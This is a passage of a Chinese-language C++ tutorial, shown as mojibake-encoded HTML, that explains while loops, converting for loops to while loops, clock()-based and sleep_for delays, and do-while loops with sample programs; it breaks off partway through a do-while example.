è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒæ¯”ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å’Œ <code>strcmp()</code> æ›´ç›´è§‚ã€æ›´å®‰å…¨ã€‚</p><h2 id="5-2-whileå¾ªç¯"><a href="#5-2-whileå¾ªç¯" class="headerlink" title="5.2 whileå¾ªç¯"></a>5.2 whileå¾ªç¯</h2><p><code>while</code> å¾ªç¯æ˜¯ C++ ä¸­å¦ä¸€ç§é‡è¦çš„å¾ªç¯ç»“æ„ã€‚ä¸ <code>for</code> å¾ªç¯ä¸åŒï¼Œ<code>while</code> å¾ªç¯åœ¨ç»“æ„ä¸Šæ›´ç®€å•ï¼Œå®ƒåªåŒ…å«ä¸€ä¸ª**æµ‹è¯•æ¡ä»¶ (Test Condition)**ã€‚åªè¦è¯¥æ¡ä»¶ä¸º <code>true</code>ï¼Œå¾ªç¯ä½“å°±ä¼šä¸€ç›´æ‰§è¡Œã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (test_condition) &#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯ä½“ (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥</span></span><br><span class="line"><span class="keyword">while</span> (test_condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> è®¡ç®— <code>test_condition</code>ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>false</code>ï¼Œè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>true</code>ï¼Œæ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚</li><li> å›åˆ°æ­¥éª¤ 1ã€‚</li></ol><p><strong>å…³é”®ç‚¹:</strong></p><ul><li>  <code>while</code> å¾ªç¯æ˜¯ä¸€ç§**å…¥å£æ¡ä»¶å¾ªç¯ (Entry-Condition Loop)**ï¼Œå³åœ¨æ¯æ¬¡æ‰§è¡Œå¾ªç¯ä½“ä¹‹å‰æ£€æŸ¥æ¡ä»¶ã€‚å¦‚æœç¬¬ä¸€æ¬¡æ£€æŸ¥æ¡ä»¶å°±ä¸º <code>false</code>ï¼Œåˆ™å¾ªç¯ä½“ä¸€æ¬¡ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚</li><li>  å¾ªç¯ä½“å†…éƒ¨<strong>å¿…é¡»</strong>æœ‰èƒ½å¤Ÿå½±å“ <code>test_condition</code> çš„è¯­å¥ï¼ˆä¾‹å¦‚ä¿®æ”¹ç”¨äºåˆ¤æ–­çš„å˜é‡ï¼‰ï¼Œå¦åˆ™å¦‚æœæ¡ä»¶åˆå§‹ä¸º <code>true</code>ï¼Œå¾ªç¯å°†æ°¸è¿œä¸ä¼šåœæ­¢ï¼Œå½¢æˆ**æ— é™å¾ªç¯ (Infinite Loop)**ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ while å¾ªç¯æ‰“å°æ•°å­— 0 åˆ° 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting with while (0-4):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">5</span>) &#123; <span class="comment">// 1. æµ‹è¯•æ¡ä»¶</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 2. å¾ªç¯ä½“</span></span><br><span class="line">        count++; <span class="comment">// 3. æ›´æ–°æ¡ä»¶å˜é‡ (éå¸¸é‡è¦!)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¤ºä¾‹ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥ç‰¹å®šå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (response != <span class="string">&#x27;y&#x27;</span> &amp;&amp; response != <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-1-forä¸while"><a href="#5-2-1-forä¸while" class="headerlink" title="5.2.1 forä¸while"></a>5.2.1 forä¸while</h3><p><code>for</code> å¾ªç¯å’Œ <code>while</code> å¾ªç¯åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯å¯ä»¥äº’æ¢çš„ï¼Œå› ä¸ºå®ƒä»¬éƒ½å¯ä»¥ç”¨æ¥å®ç°åŸºäºæ¡ä»¶çš„é‡å¤æ‰§è¡Œã€‚</p><p><strong>è½¬æ¢å…³ç³»:</strong></p><p>ä¸€ä¸ªå…¸å‹çš„ <code>for</code> å¾ªç¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç­‰ä»·åœ°è½¬æ¢ä¸º <code>while</code> å¾ªç¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">initialization; <span class="comment">// åˆå§‹åŒ–ç§»åˆ°å¾ªç¯ä¹‹å‰</span></span><br><span class="line"><span class="keyword">while</span> (test_condition) &#123; <span class="comment">// æµ‹è¯•æ¡ä»¶ä¿æŒä¸å˜</span></span><br><span class="line">    body;</span><br><span class="line">    update; <span class="comment">// æ›´æ–°ç§»åˆ°å¾ªç¯ä½“çš„æœ«å°¾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é€‰æ‹©ä¾æ®:</strong></p><ul><li><strong><code>for</code> å¾ªç¯:</strong><ul><li>  <strong>ä¼˜ç‚¹:</strong> å°†åˆå§‹åŒ–ã€æµ‹è¯•å’Œæ›´æ–°é€»è¾‘é›†ä¸­åœ¨å¾ªç¯å¤´éƒ¨ï¼Œç»“æ„æ¸…æ™°ï¼Œç‰¹åˆ«é€‚ç”¨äº<strong>è®¡æ•°å¾ªç¯</strong>ï¼ˆå¾ªç¯æ¬¡æ•°å·²çŸ¥æˆ–æ˜“äºè®¡ç®—ï¼‰æˆ–éœ€è¦æŒ‰å›ºå®šæ­¥é•¿è¿­ä»£çš„æƒ…å†µã€‚</li><li>  <strong>é€‚ç”¨åœºæ™¯:</strong> éå†æ•°ç»„ã€æŒ‰ç´¢å¼•å¤„ç†å­—ç¬¦ä¸²ã€æ‰§è¡Œå›ºå®šæ¬¡æ•°çš„æ“ä½œã€‚</li></ul></li><li><strong><code>while</code> å¾ªç¯:</strong><ul><li>  <strong>ä¼˜ç‚¹:</strong> ç»“æ„æ›´ç®€å•ï¼Œåªå…³æ³¨å¾ªç¯æ¡ä»¶ï¼Œé€‚ç”¨äºå¾ªç¯æ¬¡æ•°<strong>ä¸ç¡®å®š</strong>ï¼Œä¾èµ–äºæŸä¸ªäº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜çš„æƒ…å†µã€‚</li><li>  <strong>é€‚ç”¨åœºæ™¯:</strong> ç­‰å¾…ç”¨æˆ·è¾“å…¥ã€è¯»å–æ–‡ä»¶ç›´åˆ°ç»“æŸã€å¤„ç†é“¾è¡¨ã€å½“å¾ªç¯æ¡ä»¶æ¯”è®¡æ•°å™¨æ›´æ–°æ›´é‡è¦æ—¶ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ (ä¸¤ç§å¾ªç¯å®ç°ç›¸åŒåŠŸèƒ½):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ for å¾ªç¯è®¡ç®— 1 åˆ° 5 çš„å’Œ</span></span><br><span class="line">    <span class="keyword">int</span> sum_for = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        sum_for += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using for: &quot;</span> &lt;&lt; sum_for &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ while å¾ªç¯è®¡ç®— 1 åˆ° 5 çš„å’Œ</span></span><br><span class="line">    <span class="keyword">int</span> sum_while = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i_while = <span class="number">1</span>; <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">while</span> (i_while &lt;= <span class="number">5</span>) &#123; <span class="comment">// æµ‹è¯•æ¡ä»¶</span></span><br><span class="line">        sum_while += i_while;</span><br><span class="line">        i_while++; <span class="comment">// æ›´æ–°</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using while: &quot;</span> &lt;&lt; sum_while &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¸¤è€…å¯ä»¥è½¬æ¢ï¼Œä½†é€‰æ‹©æ›´è‡ªç„¶åœ°è¡¨è¾¾å¾ªç¯æ„å›¾çš„ç»“æ„å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚</p><h3 id="5-2-2-ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼šç¼–å†™å»¶æ—¶å¾ªç¯"><a href="#5-2-2-ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼šç¼–å†™å»¶æ—¶å¾ªç¯" class="headerlink" title="5.2.2 ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼šç¼–å†™å»¶æ—¶å¾ªç¯"></a>5.2.2 ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼šç¼–å†™å»¶æ—¶å¾ªç¯</h3><p>æœ‰æ—¶æˆ‘ä»¬éœ€è¦è®©ç¨‹åºæš‚åœæ‰§è¡Œä¸€æ®µæ—¶é—´ã€‚è™½ç„¶æœ‰æ›´ç²¾ç¡®ã€æ›´ç°ä»£çš„æ–¹æ³•ï¼ˆå¦‚ C++11 <code>&lt;chrono&gt;</code> å’Œ <code>&lt;thread&gt;</code> åº“ï¼‰ï¼Œä½†å¯ä»¥ä½¿ç”¨å¾ªç¯æ¥å®ç°ç®€å•çš„ã€åŸºäºå¤„ç†å™¨æ—¶é—´çš„**å»¶æ—¶å¾ªç¯ (Delay Loop)**ã€‚</p><p>è¿™ç§æ–¹æ³•<strong>ä¸ç²¾ç¡®ä¸”ä¸æ¨è</strong>ç”¨äºå®é™…çš„ç²¾ç¡®å»¶æ—¶ï¼Œå› ä¸ºå®ƒï¼š</p><ul><li>  <strong>ä¾èµ–äºå¤„ç†å™¨é€Ÿåº¦:</strong> åœ¨å¿«çš„ CPU ä¸Šæ‰§è¡Œæ—¶é—´çŸ­ï¼Œåœ¨æ…¢çš„ CPU ä¸Šæ‰§è¡Œæ—¶é—´é•¿ã€‚</li><li>  <strong>å—ç¼–è¯‘å™¨ä¼˜åŒ–å½±å“:</strong> ç¼–è¯‘å™¨å¯èƒ½ä¼šè¯†åˆ«å‡ºå¾ªç¯ä½“ä¸ºç©ºæˆ–æ— å‰¯ä½œç”¨ï¼Œå¹¶å°†å…¶å®Œå…¨ä¼˜åŒ–æ‰ã€‚</li><li>  <strong>æµªè´¹ CPU èµ„æº:</strong> å¾ªç¯åœ¨ç©ºè½¬ï¼Œæ¶ˆè€— CPU æ—¶é—´ï¼Œæ— æ³•æ‰§è¡Œå…¶ä»–æœ‰ç”¨ä»»åŠ¡ã€‚</li></ul><p><strong>åŸºæœ¬æ€è·¯:</strong> æ‰§è¡Œä¸€ä¸ªå·²çŸ¥éœ€è¦ä¸€å®šæ—¶é—´çš„ç©ºå¾ªç¯æˆ–ç®€å•æ“ä½œçš„å¾ªç¯ã€‚</p><p><strong>ç¤ºä¾‹ (ä½¿ç”¨ <code>&lt;ctime&gt;</code> åº“):</strong></p><p><code>&lt;ctime&gt;</code> (æˆ– C çš„ <code>&lt;time.h&gt;</code>) åº“æä¾›äº†ä¸€äº›ä¸æ—¶é—´ç›¸å…³çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥å®ç°ç¨å¾®å¥½ä¸€ç‚¹ï¼ˆä½†ä»ä¸ç†æƒ³ï¼‰çš„å»¶æ—¶ã€‚</p><ul><li>  <code>clock()</code>: è¿”å›ç¨‹åºå¯åŠ¨ä»¥æ¥æ‰€ç”¨çš„<strong>æ—¶é’Ÿè®¡æ—¶å•å…ƒ (clock ticks)</strong> æ•°ã€‚</li><li>  <code>CLOCKS_PER_SEC</code>: ä¸€ä¸ªå¸¸é‡ï¼Œè¡¨ç¤ºæ¯ç§’åŒ…å«çš„æ—¶é’Ÿè®¡æ—¶å•å…ƒæ•°ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt; // ä¸ºäº† clock() å’Œ CLOCKS_PER_SEC</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> delay_seconds = <span class="number">2.5f</span>; <span class="comment">// æœŸæœ›å»¶æ—¶ 2.5 ç§’</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¼€å§‹æ—¶é—´</span></span><br><span class="line">    <span class="keyword">clock_t</span> start_time = clock(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—ç›®æ ‡ç»“æŸæ—¶é—´ (ä»¥ clock ticks ä¸ºå•ä½)</span></span><br><span class="line">    <span class="keyword">clock_t</span> target_ticks = delay_seconds * CLOCKS_PER_SEC; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯ç›´åˆ°ç»è¿‡äº†è¶³å¤Ÿå¤šçš„ clock ticks</span></span><br><span class="line">    <span class="keyword">while</span> (clock() &lt; start_time + target_ticks) &#123;</span><br><span class="line">        <span class="comment">// å¾ªç¯ä½“å¯ä»¥ä¸ºç©ºï¼Œæˆ–è€…æ‰§è¡Œä¸€äº›è½»é‡æ“ä½œ</span></span><br><span class="line">        <span class="comment">// ; // ç©ºè¯­å¥</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delay finished after approximately &quot;</span> &lt;&lt; delay_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦ä¸€ä¸ªç®€å•çš„ç©ºå¾ªç¯å»¶æ—¶ (éå¸¸ä¸ç²¾ç¡®)</span></span><br><span class="line">    <span class="comment">// long wait = 0;</span></span><br><span class="line">    <span class="comment">// while (wait &lt; 100000000) &#123; // å¾ªç¯æ¬¡æ•°éœ€è¦æ ¹æ®æœºå™¨è°ƒæ•´</span></span><br><span class="line">    <span class="comment">//     wait++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å†æ¬¡å¼ºè°ƒ:</strong> å¯¹äºéœ€è¦ç²¾ç¡®å»¶æ—¶æˆ–æš‚åœæ‰§è¡Œè€Œä¸æµªè´¹ CPU çš„åœºæ™¯ï¼Œåº”ä½¿ç”¨ C++11 åŠæ›´é«˜ç‰ˆæœ¬æä¾›çš„ <code>&lt;chrono&gt;</code> å’Œ <code>&lt;thread&gt;</code> ä¸­çš„ <code>std::this_thread::sleep_for()</code> æˆ– <code>std::this_thread::sleep_until()</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt; // ä¸ºäº†æ—¶é—´å•ä½ (e.g., seconds, milliseconds)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt; // ä¸ºäº† std::this_thread::sleep_for</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting modern delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å»¶æ—¶ 2 ç§’ 500 æ¯«ç§’</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::seconds <span class="title">sec</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::milliseconds <span class="title">ms</span><span class="params">(<span class="number">500</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::this_thread::sleep_for(sec + ms); <span class="comment">// çº¿ç¨‹ä¼‘çœ ï¼Œä¸æ¶ˆè€— CPU</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modern delay finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç°ä»£æ–¹æ³•æ›´ç²¾ç¡®ã€å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå¹¶ä¸”ä¸ä¼šæµªè´¹ CPU å‘¨æœŸã€‚</p><h2 id="5-3-do-whileå¾ªç¯"><a href="#5-3-do-whileå¾ªç¯" class="headerlink" title="5.3 do whileå¾ªç¯"></a>5.3 do whileå¾ªç¯</h2><p><code>do while</code> å¾ªç¯æ˜¯ C++ æä¾›çš„ç¬¬ä¸‰ç§å¾ªç¯ç»“æ„ã€‚å®ƒä¸ <code>while</code> å¾ªç¯éå¸¸ç›¸ä¼¼ï¼Œä½†æœ‰ä¸€ä¸ªå…³é”®åŒºåˆ«ï¼š<code>do while</code> å¾ªç¯æ˜¯**å‡ºå£æ¡ä»¶å¾ªç¯ (Exit-Condition Loop)**ï¼Œè€Œ <code>while</code> å¾ªç¯æ˜¯å…¥å£æ¡ä»¶å¾ªç¯ã€‚</p><p>è¿™æ„å‘³ç€ <code>do while</code> å¾ªç¯ä¼š<strong>å…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“</strong>ï¼Œ<strong>ç„¶åå†</strong>æ£€æŸ¥æµ‹è¯•æ¡ä»¶ã€‚åªè¦æ¡ä»¶ä¸º <code>true</code>ï¼Œå¾ªç¯å°±ä¼šç»§ç»­æ‰§è¡Œã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯ä½“ (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">while</span> (test_condition); <span class="comment">// æ³¨æ„è¿™é‡Œçš„æ¡ä»¶åé¢å¿…é¡»æœ‰åˆ†å· ;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥ï¼ˆè™½ç„¶ä¸å¸¸è§ï¼Œä¸”ä¸ºäº†æ¸…æ™°é€šå¸¸è¿˜æ˜¯ç”¨èŠ±æ‹¬å·ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    single_statement;</span><br><span class="line"><span class="keyword">while</span> (test_condition); </span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> æ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚</li><li> è®¡ç®— <code>test_condition</code>ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>true</code>ï¼Œå›åˆ°æ­¥éª¤ 1ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>false</code>ï¼Œå¾ªç¯ç»ˆæ­¢ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚</li></ol><p><strong>å…³é”®ç‚¹:</strong></p><ul><li>  <strong>è‡³å°‘æ‰§è¡Œä¸€æ¬¡:</strong> ç”±äºæ¡ä»¶æ˜¯åœ¨å¾ªç¯ä½“æ‰§è¡Œä¹‹åæ£€æŸ¥çš„ï¼Œ<code>do while</code> å¾ªç¯çš„å¾ªç¯ä½“<strong>è‡³å°‘ä¼šæ‰§è¡Œä¸€æ¬¡</strong>ï¼Œå³ä½¿æ¡ä»¶åˆå§‹å°±ä¸º <code>false</code>ã€‚</li><li>  <strong>åˆ†å·:</strong> <code>while (test_condition)</code> åé¢å¿…é¡»æœ‰ä¸€ä¸ªåˆ†å· <code>;</code>ã€‚</li><li>  <strong>é€‚ç”¨åœºæ™¯:</strong> å½“ä½ éœ€è¦ç¡®ä¿å¾ªç¯ä½“ä¸­çš„ä»£ç è‡³å°‘æ‰§è¡Œä¸€æ¬¡æ—¶ï¼Œ<code>do while</code> å¾ªç¯æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œè·å–ç”¨æˆ·è¾“å…¥å¹¶éªŒè¯ï¼Œè‡³å°‘éœ€è¦è·å–ä¸€æ¬¡è¾“å…¥æ‰èƒ½è¿›è¡ŒéªŒè¯ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¤ºä¾‹ï¼šè¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ­£æ•°</span></span><br><span class="line">    <span class="comment">// 